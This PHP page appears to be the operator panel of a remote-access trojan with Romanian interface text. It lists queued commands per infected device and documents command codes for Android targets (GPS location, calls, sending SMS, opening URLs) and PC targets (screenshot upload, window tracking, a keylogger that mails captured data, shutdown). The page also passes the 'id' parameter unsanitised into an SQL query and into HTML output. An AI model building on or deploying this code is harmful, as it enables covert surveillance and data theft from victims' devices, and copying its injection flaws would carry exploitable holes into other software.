<?php include 'header.php'; ?>
<h1>Latest Commands</h1>
<?php
$id = $_GET["id"];
$type = $_GET["type"];
if ($conn->connect_error)
{
	echo 'Eroare in conectarea la baza de date';
} else {

	
			echo '<a href="addcmd.php?id='.$id.'&type='.$type.'" class="btn btn-info" role="button">Add Comamnd for this ID</a>';
			
			echo '<a href="viewrep.php?id='.$id.'" class="btn btn-info" role="button">View Reports for this ID</a>';
			
			
			$sql = "SELECT * FROM commands WHERE id = '".$id."' ORDER BY done ASC";
			$result = $conn->query($sql);

			if ($result->num_rows > 0) 
			{
			echo '
	<table class="table table-condensed">
    <thead>
      <tr>
        <th>id</th>
        <th>cmd</th>
        <th>username</th>
		<th>done</th>
		
	
      </tr>
    </thead>
    <tbody>';
				// output data of each row
				while($row = $result->fetch_assoc()) {
					$doneNew = "No";
					if($row["done"] == "1")
					{
						$doneNew = "Yes";
					}
					echo '<tr><td>'.$row["id"].'</td><td>'.$row["cmd"].'</td><td>'.$row["username"].'</td><td>'.$doneNew.'</td></tr>';
				
				
				}
			echo ' </tbody>
  </table>';
			}
			else {
				echo "<h2>No commands</h2>";
			}
			$conn->close();
			
		
			
		

		}
		
		
		if($type == "Android")
		{
			echo '<h3>Comenzi Android</h3>
<p>101[msg]-toast </p>
<p>102[msg] - notif</p>
<p>103 - get gps</p>
<p>104[number] - call number</p>
<p>105[number]\[msg] - sendsms</p>
<p>106[link] - openurl</p>';
		}
		else
		{
			echo '<h3>Comenzi PC</h3>
<p>201[msg]- messagebox</p>
<p>231 - open cd</p>
<p>211 - take ss and upload it</p>
<p>212 - current window</p>
<p>213[mail] - Keylogger send datas</p>
<p>232 - shutdown</p>
<p>233 - restart</p>
<p>234 - logoff</p>';
		}
?>
